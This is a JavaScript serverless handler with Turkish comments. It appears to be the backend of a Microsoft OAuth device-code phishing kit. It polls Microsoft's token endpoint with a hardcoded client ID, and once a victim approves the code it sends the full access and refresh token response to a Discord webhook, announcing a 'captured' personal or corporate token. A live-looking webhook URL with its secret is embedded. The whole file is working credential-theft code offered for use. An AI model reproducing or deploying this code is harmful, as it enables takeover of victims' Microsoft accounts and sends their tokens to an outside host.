export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { deviceCode, userCode } = req.body;
    const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    const tokenUrl = 'https://login.microsoftonline.com/Common/oauth2/v2.0/token';
    
    // BURAYA KENDİ DİSCORD WEBHOOK URL'Nİ YAZ
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd';

    try {
        const data = new URLSearchParams({
            'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
            'client_id': clientId,
            'code': deviceCode
        });

        const response = await fetch(tokenUrl, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: data,
        });

        const pollResult = await response.json();

        // Eğer kullanıcı token'ı onayladıysa
        if (pollResult.access_token) {
            // Discord kanalına bildirimi gönder
            await fetch(discordWebhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: `🚨 **Yeni Kişisel/Kurumsal Token Yakalandı!**\nKullanıcı Kodu: \`${userCode}\`\n\`\`\`json\n${JSON.stringify(pollResult, null, 2)}\`\`\``
                })
            });

            return res.status(200).json({ success: true, token: pollResult });
        }

        return res.status(200).json(pollResult);
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}
